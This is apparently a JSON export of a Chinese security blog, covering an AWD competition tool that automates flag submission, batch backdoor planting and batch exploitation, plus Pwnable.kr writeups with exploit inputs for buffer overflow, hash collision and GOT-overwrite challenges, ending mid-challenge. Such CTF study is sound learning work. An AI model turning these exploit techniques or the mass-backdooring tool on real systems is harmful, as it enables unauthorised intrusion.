[{"title":"AWD-Tools","url":"https://xuccc.github.io/CTF/AWD/AWD-Tools/","content":"<h2 id=\"AWD-文章\"><a href=\"#AWD-文章\" class=\"headerlink\" title=\"AWD 文章\"></a>AWD 文章</h2><p>TODO</p>\n<h2 id=\"AWD-工具\"><a href=\"#AWD-工具\" class=\"headerlink\" title=\"AWD 工具\"></a>AWD 工具</h2><p>TODO</p>\n<h2 id=\"自己的AWD工具\"><a href=\"#自己的AWD工具\" class=\"headerlink\" title=\"自己的AWD工具\"></a>自己的AWD工具</h2><h3 id=\"AutoSubmitFlag\"><a href=\"#AutoSubmitFlag\" class=\"headerlink\" title=\"AutoSubmitFlag\"></a>AutoSubmitFlag</h3><p>  本着练习一下码代码的能力写了一份自动交flag的命令行脚本,主要实现</p>\n<ul>\n<li>从命令行读取主要参数，平台地址，队伍Token，目标IP池等</li>\n<li>Web直接读取Requestes信息，完成批量工具<ul>\n<li>批量后门种植工作</li>\n</ul>\n</li>\n<li>Pwn读取exp，完成批量攻击</li>\n</ul>\n<p>每天写一点，断断续续写了一个星期。。写完回头看了下代码写得好丑感觉。。考完期中考试有空还是重构一下 = =</p>\n<p><img src=\"/CTF/AWD/AWD-Tools/home.png\" alt=\"home\"></p>\n<h4 id=\"主要用到的库\"><a href=\"#主要用到的库\" class=\"headerlink\" title=\"主要用到的库\"></a>主要用到的库</h4><ul>\n<li><a href=\"http://click.pocoo.org/dev/\" target=\"_blank\" rel=\"external\">click</a>命令行参数解析</li>\n<li><a href=\"http://cn.python-requests.org/zh_CN/latest/\" target=\"_blank\" rel=\"external\">Requestes</a>不解释</li>\n<li>urlparse url 分割及参数提取</li>\n<li><a href=\"https://pypi.python.org/pypi/PrettyTable\" target=\"_blank\" rel=\"external\">prettytable</a>表格化输出</li>\n</ul>\n<h4 id=\"Tips\"><a href=\"#Tips\" class=\"headerlink\" title=\"Tips\"></a>Tips</h4><p>写完看了下好像也没啥，然而写的时候各种googlge。。</p>\n<ul>\n<li>错误处理</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">try</span>:</div><div class=\"line\">    req = eval(exp)</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">except</span> SyntaxError, e:</div><div class=\"line\">    log.error(<span class=\"string\">'The input file maybe wrong'</span> % e.__class__.__name__)</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'Input ERROR'</span>, <span class=\"keyword\">None</span></div><div class=\"line\"><span class=\"keyword\">except</span> Exception, e:</div><div class=\"line\">    log.error(<span class=\"string\">'IP:%s Port:%s is outline:%s'</span> % (ip,port,e.__class__.__name__))</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'Connection ERROR'</span>, <span class=\"keyword\">None</span></div><div class=\"line\"><span class=\"keyword\">else</span>:</div><div class=\"line\">    html = req.content</div><div class=\"line\">    flag = FLAG_PATTERN.findall(html)</div><div class=\"line\">    <span class=\"keyword\">if</span> flag:</div><div class=\"line\">        log.success(<span class=\"string\">'IP:%s Port:%s Flag: %s'</span> % (ip, port, flag[<span class=\"number\">0</span>]))</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Success'</span>, flag[<span class=\"number\">0</span>]</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        log.warn(<span class=\"string\">'IP:%s Port:%s is reinforced'</span> % (ip, port))</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Miss'</span>,<span class=\"keyword\">None</span></div></pre></td></tr></table></figure>\n<ul>\n<li>命令行参数解析</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">@cli.command('auto')</span></div><div class=\"line\"><span class=\"meta\">@click.argument('platform', metavar='&lt;Platform Url&gt;')</span></div><div class=\"line\"><span class=\"meta\">@click.argument('ips',metavar='&lt;Target IPs&gt;')</span></div><div class=\"line\"><span class=\"meta\">@click.option('--method', '-m', default='post', type=click.Choice(['get', 'post']),</span></div><div class=\"line\">              help=<span class=\"string\">'Method to submit flag'</span>)</div><div class=\"line\"><span class=\"meta\">@click.option('--token', help='Your Team Token')</span></div><div class=\"line\"><span class=\"meta\">@click.option('--delete', '-d', multiple=True, help='Delete the ip from ipList')</span></div><div class=\"line\"><span class=\"meta\">@click.option('--payload', '-p', nargs=3, multiple=True,</span></div><div class=\"line\">              help=<span class=\"string\">\"Web payload with 3 arguments:url,method,query\"</span>)</div><div class=\"line\"><span class=\"meta\">@click.option('--web', type=click.File('rb'),help=\"Load web payload from file\")</span></div><div class=\"line\"><span class=\"meta\">@click.option('--pwn',multiple=True,type=click.File('rb'))</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">auto</span><span class=\"params\">(platform, ips, method, token, delete, payload, web, pwn)</span>:</span></div></pre></td></tr></table></figure>\n<ul>\n<li>动态加载</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">frompwn</span><span class=\"params\">(self,ip,file)</span>:</span></div><div class=\"line\">    <span class=\"keyword\">try</span>:</div><div class=\"line\">        flag = __import__(file).exploit(ip)</div></pre></td></tr></table></figure>\n","categories":["CTF","AWD"],"tags":["CTF","Python"]},{"title":"堆溢出","url":"https://xuccc.github.io/CTF/Pwn/堆溢出/","content":"<p><a href=\"http://www.freebuf.com/articles/system/104144.html\" target=\"_blank\" rel=\"external\">Linux堆内存管理深入分析(上)</a><br><a href=\"http://www.freebuf.com/articles/security-management/105285.html\" target=\"_blank\" rel=\"external\">Linux堆内存管理深入分析（下）</a></p>\n<h2 id=\"UAF\"><a href=\"#UAF\" class=\"headerlink\" title=\"UAF\"></a>UAF</h2><h3 id=\"相关题目\"><a href=\"#相关题目\" class=\"headerlink\" title=\"相关题目\"></a>相关题目</h3><ul>\n<li><a href=\"http://pwnable.kr/play.php\" target=\"_blank\" rel=\"external\">Pwnable uaf</a></li>\n</ul>\n","categories":["CTF","Pwn"],"tags":["Pwn"]},{"title":"Pwnable.kr Writeup","url":"https://xuccc.github.io/CTF/Writeup/Pwnable/","content":"<h2 id=\"fd\"><a href=\"#fd\" class=\"headerlink\" title=\"fd\"></a>fd</h2><p>连上去后查看源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"keyword\">char</span> buf[<span class=\"number\">32</span>];</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[], <span class=\"keyword\">char</span>* envp[])</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(argc&lt;<span class=\"number\">2</span>)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"pass argv[1] a number\\n\"</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">int</span> fd = atoi( argv[<span class=\"number\">1</span>] ) - <span class=\"number\">0x1234</span>;</div><div class=\"line\">\t<span class=\"keyword\">int</span> len = <span class=\"number\">0</span>;</div><div class=\"line\">\tlen = read(fd, buf, <span class=\"number\">32</span>);</div><div class=\"line\">\t<span class=\"keyword\">if</span>(!<span class=\"built_in\">strcmp</span>(<span class=\"string\">\"LETMEWIN\\n\"</span>, buf))&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"good job :)\\n\"</span>);</div><div class=\"line\">\t\tsystem(<span class=\"string\">\"/bin/cat flag\"</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"learn about Linux file IO\\n\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<ul>\n<li>atoi </li>\n</ul>\n<p>(表示 ascii to integer)是把字符串转换成整型数的一个函数</p>\n<ul>\n<li>read</li>\n</ul>\n<p><code>ssize_t read(int fd,void * buf ,size_t count);</code></p>\n<p>read()会把参数fd 所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动。</p>\n<ul>\n<li>Linux文件描述符</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>nteger value</th>\n<th>Name</th>\n<th>symbolic constant</th>\n<th>file stream</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0</td>\n<td>Standard input</td>\n<td>STDIN_FILENO</td>\n<td>stdin</td>\n</tr>\n<tr>\n<td>1</td>\n<td>Standard output</td>\n<td>STDOUT_FILENO</td>\n<td>stdout</td>\n</tr>\n<tr>\n<td>2</td>\n<td>Standard error</td>\n<td>STDERR_FILENO</td>\n<td>stderr</td>\n</tr>\n</tbody>\n</table>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">fd@ubuntu:~$ ./fd 4660</div><div class=\"line\">LETMEWIN</div><div class=\"line\">good job :)</div><div class=\"line\">mommy! I think I know what a file descriptor is!!</div></pre></td></tr></table></figure>\n<h2 id=\"collision\"><a href=\"#collision\" class=\"headerlink\" title=\"collision\"></a>collision</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> hashcode = <span class=\"number\">0x21DD09EC</span>;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"title\">check_password</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span>* p)</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span>* ip = (<span class=\"keyword\">int</span>*)p;</div><div class=\"line\">\t<span class=\"keyword\">int</span> i;</div><div class=\"line\">\t<span class=\"keyword\">int</span> res=<span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>; i&lt;<span class=\"number\">5</span>; i++)&#123;</div><div class=\"line\">\t\tres += ip[i];</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> res;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(argc&lt;<span class=\"number\">2</span>)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"usage : %s [passcode]\\n\"</span>, argv[<span class=\"number\">0</span>]);</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">strlen</span>(argv[<span class=\"number\">1</span>]) != <span class=\"number\">20</span>)&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"passcode length should be 20 bytes\\n\"</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">if</span>(hashcode == check_password( argv[<span class=\"number\">1</span>] ))&#123;</div><div class=\"line\">\t\tsystem(<span class=\"string\">\"/bin/cat flag\"</span>);</div><div class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"wrong passcode.\\n\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<ul>\n<li><code>check_password</code>中的强制转化,将字符转为整数指针，<strong>char占1位，int占4位</strong>——–&gt;<strong>20char = 5 int</strong></li>\n<li>小段模式输入</li>\n</ul>\n<blockquote>\n<p>0x21DD09EC = 568134124 = 113626824<em>4 + 113626828 = 0x06c5cec8</em>4 + 0x06c5cecc</p>\n</blockquote>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">col@ubuntu:~$ ./col $(python -c \"print '\\xc8\\xce\\xc5\\x06'*4+'\\xcc\\xce\\xc5\\x06'\")</div><div class=\"line\">daddy! I just managed to create a hash collision :)</div></pre></td></tr></table></figure>\n<div class=\"note warning\"><p>Why?</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">col@ubuntu:~$ python -c \"print '\\xc8\\xce\\xc5\\x06'*4+'\\xcc\\xce\\xc5\\x06'\"|./col</div><div class=\"line\">usage : ./col [passcode]</div><div class=\"line\">close failed in file object destructor:</div><div class=\"line\">sys.excepthook is missing</div><div class=\"line\">lost sys.stderr</div></pre></td></tr></table></figure>\n<h2 id=\"bof\"><a href=\"#bof\" class=\"headerlink\" title=\"bof\"></a>bof</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"keyword\">int</span> key)</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">char</span> overflowme[<span class=\"number\">32</span>];</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"overflow me : \"</span>);</div><div class=\"line\">\tgets(overflowme);\t<span class=\"comment\">// smash me!</span></div><div class=\"line\">\t<span class=\"keyword\">if</span>(key == <span class=\"number\">0xcafebabe</span>)&#123;</div><div class=\"line\">\t\tsystem(<span class=\"string\">\"/bin/sh\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">else</span>&#123;</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Nah..\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">&#125;</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[])</span></span>&#123;</div><div class=\"line\">\tfunc(<span class=\"number\">0xdeadbeef</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><div class=\"line\">payload = p32(<span class=\"number\">0xcafebabe</span>) * <span class=\"number\">50</span></div><div class=\"line\">io.sendline(payload)</div><div class=\"line\">io.interactive()</div></pre></td></tr></table></figure>\n<h2 id=\"flag\"><a href=\"#flag\" class=\"headerlink\" title=\"flag\"></a>flag</h2><p>逆向题…</p>\n<p><code>upx -d flag -o out</code> 脱壳后,IDA 查看字符串</p>\n<p><img src=\"/CTF/Writeup/Pwnable/1.png\" alt=\"1\"></p>\n<h2 id=\"passcode\"><a href=\"#passcode\" class=\"headerlink\" title=\"passcode\"></a>passcode</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">login</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">int</span> passcode1;</div><div class=\"line\">\t<span class=\"keyword\">int</span> passcode2;</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"enter passcode1 : \"</span>);</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, passcode1);</div><div class=\"line\">\tfflush(<span class=\"built_in\">stdin</span>);</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"enter passcode2 : \"</span>);</div><div class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, passcode2);</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"checking...\\n\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">if</span>(passcode1==<span class=\"number\">338150</span> &amp;&amp; passcode2==<span class=\"number\">13371337</span>)&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"Login OK!\\n\"</span>);</div><div class=\"line\">                system(<span class=\"string\">\"/bin/cat flag\"</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">        <span class=\"keyword\">else</span>&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"Login Failed!\\n\"</span>);</div><div class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</div><div class=\"line\">        &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">welcome</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">\t<span class=\"keyword\">char</span> name[<span class=\"number\">100</span>];</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"enter you name : \"</span>);</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%100s\"</span>, name);</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Welcome %s!\\n\"</span>, name);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Toddler's Secure Login System 1.0 beta.\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">\twelcome();</div><div class=\"line\">\tlogin();</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">// something after login...</span></div><div class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Now I can safely trust you that you have credential :)\\n\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;\t</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<ul>\n<li>通过溢出控制<code>scanf(&quot;%d&quot;, passcode1);</code> 使得passcode1可控</li>\n<li>修改<code>printf</code> or <code>exit</code> 使其指向 0x080485e3</li>\n</ul>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">root in ~/Desktop/tmp λ python -c \"print 'A'*96 + '\\x00\\xa0\\x04\\x08' +'\\n' + '134514147' + '\\n' \"|./passcode</div><div class=\"line\">Toddler's Secure Login System 1.0 beta.</div><div class=\"line\">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</div><div class=\"line\">/bin/cat: flag: No such file or directory</div><div class=\"line\">enter passcode1 : Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>\n<h2 id=\"random\"><a href=\"#random\" class=\"headerlink\" title=\"random\"></a>random</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</div><div class=\"line\">        <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> random;</div><div class=\"line\">        random = rand();        <span class=\"comment\">// random value!</span></div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> key=<span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;key);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">if</span>( (key ^ random) == <span class=\"number\">0xdeadbeef</span> )&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"Good!\\n\"</span>);</div><div class=\"line\">                system(<span class=\"string\">\"/bin/cat flag\"</span>);</div><div class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Wrong, maybe you should try 2^32 cases.\\n\"</span>);</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<div class=\"note info\"><p>Points</p></div>\n<ul>\n<li>c中的rand函数产生的是伪随机数,每次产生出的是固定值</li>\n<li>dword   双字 就是四个字节</li>\n<li>ptr     pointer缩写 即指针</li>\n</ul>\n<div class=\"note success\"><p>Exp</p></div>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><div class=\"line\">random@ubuntu:~$ ./random </div><div class=\"line\">3039230856</div><div class=\"line\">Good!</div><div class=\"line\">Mommy, I thought libc random is unpredictable...</div></pre></td></tr></table></figure>\n<h2 id=\"input\"><a href=\"#input\" class=\"headerlink\" title=\"input\"></a>input</h2><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/socket.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;arpa/inet.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>* argv[], <span class=\"keyword\">char</span>* envp[])</span></span>&#123;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Welcome to pwnable.kr\\n\"</span>);</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Let's see if you know how to give input to program\\n\"</span>);</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Just give me correct inputs then you will get the flag :)\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// argv</span></div><div class=\"line\">        <span class=\"keyword\">if</span>(argc != <span class=\"number\">100</span>) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">strcmp</span>(argv[<span class=\"string\">'A'</span>],<span class=\"string\">\"\\x00\"</span>)) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">strcmp</span>(argv[<span class=\"string\">'B'</span>],<span class=\"string\">\"\\x20\\x0a\\x0d\"</span>)) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Stage 1 clear!\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// stdio</span></div><div class=\"line\">        <span class=\"keyword\">char</span> buf[<span class=\"number\">4</span>];</div><div class=\"line\">        read(<span class=\"number\">0</span>, buf, <span class=\"number\">4</span>);</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">memcmp</span>(buf, <span class=\"string\">\"\\x00\\x0a\\x00\\xff\"</span>, <span class=\"number\">4</span>)) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        read(<span class=\"number\">2</span>, buf, <span class=\"number\">4</span>);</div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">memcmp</span>(buf, <span class=\"string\">\"\\x00\\x0a\\x02\\xff\"</span>, <span class=\"number\">4</span>)) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Stage 2 clear!\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// env</span></div><div class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"built_in\">strcmp</span>(<span class=\"string\">\"\\xca\\xfe\\xba\\xbe\"</span>, getenv(<span class=\"string\">\"\\xde\\xad\\xbe\\xef\"</span>))) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Stage 3 clear!\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// file</span></div><div class=\"line\">        FILE* fp = fopen(<span class=\"string\">\"\\x0a\"</span>, <span class=\"string\">\"r\"</span>);</div><div class=\"line\">        <span class=\"keyword\">if</span>(!fp) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"keyword\">if</span>( fread(buf, <span class=\"number\">4</span>, <span class=\"number\">1</span>, fp)!=<span class=\"number\">1</span> ) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        <span class=\"keyword\">if</span>( <span class=\"built_in\">memcmp</span>(buf, <span class=\"string\">\"\\x00\\x00\\x00\\x00\"</span>, <span class=\"number\">4</span>) ) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        fclose(fp);</div><div class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"Stage 4 clear!\\n\"</span>);</div><div class=\"line\"></div><div class=\"line\">        <span class=\"comment\">// network</span></div><div class=\"line\">        <span class=\"keyword\">int</span> sd, cd;</div><div class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sockaddr_in</span> <span class=\"title\">saddr</span>, <span class=\"title\">caddr</span>;</span></div><div class=\"line\">        sd = socket(AF_INET, SOCK_STREAM, <span class=\"number\">0</span>);</div><div class=\"line\">        <span class=\"keyword\">if</span>(sd == <span class=\"number\">-1</span>)&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"socket error, tell admin\\n\"</span>);</div><div class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">        saddr.sin_family = AF_INET;</div><div class=\"line\">        saddr.sin_addr.s_addr = INADDR_ANY;</div><div class=\"line\">        saddr.sin_port = htons( atoi(argv[<span class=\"string\">'C'</span>]) );</div><div class=\"line\">        <span class=\"keyword\">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class=\"keyword\">sizeof</span>(saddr)) &lt; <span class=\"number\">0</span>)&#123;</div><div class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">\"bind error, use another port\\n\"</span>);</div><div class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\">        listen(sd, <span class=\"number\">1</span>);</div><div class=\"line\">        <span class=\"keyword\">int</span> c = <span class=\"keyword\">sizeof</span>(struct sockaddr_in);</div><div class=\"line\">        cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span 